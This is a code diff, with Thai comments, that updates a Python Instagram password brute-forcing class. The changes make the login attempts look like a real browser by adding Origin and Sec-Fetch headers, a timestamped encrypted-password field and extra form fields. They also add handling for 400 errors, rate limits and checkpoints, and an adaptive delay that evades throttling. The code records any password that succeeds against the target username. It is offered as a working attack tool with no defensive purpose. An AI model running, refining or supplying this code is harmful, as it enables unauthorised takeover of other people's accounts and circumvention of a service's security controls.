@@ -131,24 +131,24 @@ class InstagramBruteForcer:
     def attempt_login(self, password):
         """
         ลองล็อกอินด้วยรหัสผ่านที่กำหนด
-
+        
         Args:
             password (str): รหัสผ่านที่จะลอง
-
+            
         Returns:
             tuple: (success, message) - success=True ถ้าสำเร็จ
         """
         # เพิ่มจำนวนครั้งที่ลอง
         self.attempts += 1
-
+        
         print(f"\n🔑 ครั้งที่ {self.attempts}: ลองรหัสผ่าน '{password}'")
-
+        
         # ดึง CSRF token ใหม่ทุกครั้ง
         csrf_token = self.get_csrf_token()
         if not csrf_token:
             return False, "ไม่สามารถดึง CSRF token ได้"
-
-        # เตรียม headers สำหรับ login request
+        
+        # เตรียม headers สำหรับ login request (ปรับปรุงแล้ว)
         headers = {
             'User-Agent': self.ua.random,  # สุ่ม User-Agent ใหม่
             'X-CSRFToken': csrf_token,     # ใส่ CSRF token
@@ -160,18 +160,23 @@ class InstagramBruteForcer:
             'Accept-Language': 'en-US,en;q=0.9',
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
+            'Origin': 'https://www.instagram.com',  # เพิ่ม Origin
+            'Sec-Fetch-Dest': 'empty',              # เพิ่ม security headers
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
         }
-
-        # เตรียมข้อมูลสำหรับส่ง login
+        
+        # เตรียมข้อมูลสำหรับส่ง login (ปรับปรุง format)
         payload = {
             'username': self.target_username,
-            # รูปแบบใหม่ของ Instagram
-            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',  # เพิ่ม timestamp
             'queryParams': '{}',
             'optIntoOneTap': 'false',
-            'trustedDeviceRecords': '{}'
+            'trustedDeviceRecords': '{}',
+            'stopDeletionNonce': '',  # เพิ่ม field ที่ Instagram ต้องการ
+            'queryParams': '{}'       # ยืนยัน queryParams
         }
-
+        
         try:
             # ส่ง POST request ไป login
             response = self.scraper.post(
@@ -180,58 +185,84 @@ class InstagramBruteForcer:
                 headers=headers,
                 timeout=20  # timeout 20 วินาที
             )
-
+            
             # ตรวจสอบ status code
             if response.status_code == 429:
                 # โดน rate limit
                 self.rate_limited += 1
-                print(
-                    f"🚨 429 Too Many Requests! (ครั้งที่ {self.rate_limited})")
+                print(f"🚨 429 Too Many Requests! (ครั้งที่ {self.rate_limited})")
                 self.adaptive_delay(rate_limited=True)
                 return False, "โดน rate limit"
-
+            
+            elif response.status_code == 400:
+                # Bad Request - วิเคราะห์สาเหตุ
+                print(f"⚠️ HTTP 400 Bad Request")
+                try:
+                    error_data = response.json()
+                    error_msg = error_data.get('message', 'ไม่ทราบสาเหตุ')
+                    print(f"💬 Error message: {error_msg}")
+                    
+                    # ตรวจสอบ error เฉพาะ
+                    if 'checkpoint' in error_msg.lower():
+                        print(f"🔒 Account checkpoint required")
+                        return False, "Checkpoint required"
+                    elif 'rate' in error_msg.lower():
+                        print(f"🚨 Rate limit detected in 400 response")
+                        self.adaptive_delay(rate_limited=True)
+                        return False, "Rate limited (400)"
+                    else:
+                        print(f"❌ Format error - ปรับ payload และลองใหม่")
+                        self.failed_attempts += 1
+                        return False, f"400 Error: {error_msg}"
+                        
+                except json.JSONDecodeError:
+                    print(f"💥 400 Error - ไม่สามารถ parse response")
+                    self.failed_attempts += 1
+                    return False, "400 Bad Request"
+            
             elif response.status_code == 200:
                 # response ปกติ
                 try:
                     result = response.json()  # แปลง response เป็น JSON
-
+                    
                     # ตรวจสอบว่าล็อกอินสำเร็จหรือไม่
                     if result.get('authenticated'):
                         print(f"🎉 สำเร็จ! รหัสผ่านถูกต้อง: {password}")
                         self.found_password = password
                         self.save_success(password, response)
                         return True, "ล็อกอินสำเร็จ"
-
+                    
                     elif result.get('message'):
                         # มี error message
                         message = result.get('message')
                         print(f"❌ ล้มเหลว: {message}")
                         self.failed_attempts += 1
-
+                        
                         # ตรวจสอบ error message เฉพาะ
                         if 'rate limited' in message.lower():
                             self.adaptive_delay(rate_limited=True)
                         else:
                             self.adaptive_delay(rate_limited=False)
-
+                        
                         return False, message
-
+                    
                     else:
                         # รหัสผ่านผิด
                         print(f"❌ รหัสผ่านผิด: {password}")
                         self.failed_attempts += 1
                         self.adaptive_delay(rate_limited=False)
                         return False, "รหัสผ่านผิด"
-
+                
                 except json.JSONDecodeError:
                     print(f"⚠️ ไม่สามารถแปลง response เป็น JSON ได้")
                     return False, "Response format error"
-
+            
             else:
                 # HTTP error อื่นๆ
                 print(f"⚠️ HTTP Error {response.status_code}")
+                print(f"📄 Response: {response.text[:200]}...")  # แสดง response snippet
                 return False, f"HTTP {response.status_code}"
-
+        
         except Exception as e:
             print(f"💥 ข้อผิดพลาด: {e}")
             return False, str(e)
